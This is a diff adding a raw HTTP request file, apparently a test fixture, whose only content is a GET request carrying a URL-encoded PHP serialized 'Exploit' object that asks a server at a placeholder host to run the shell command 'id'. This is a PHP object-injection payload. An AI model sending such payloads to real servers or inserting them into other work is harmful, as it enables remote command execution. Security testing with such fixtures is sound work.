@@ -1,0 +1,4 @@
+GET /a?cmd=O%3A8%3A%22Exploit%22%3A1%3A%7Bs%3A4%3A%22shell%22%3Bs%3A3%3A%22id%22%3B%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
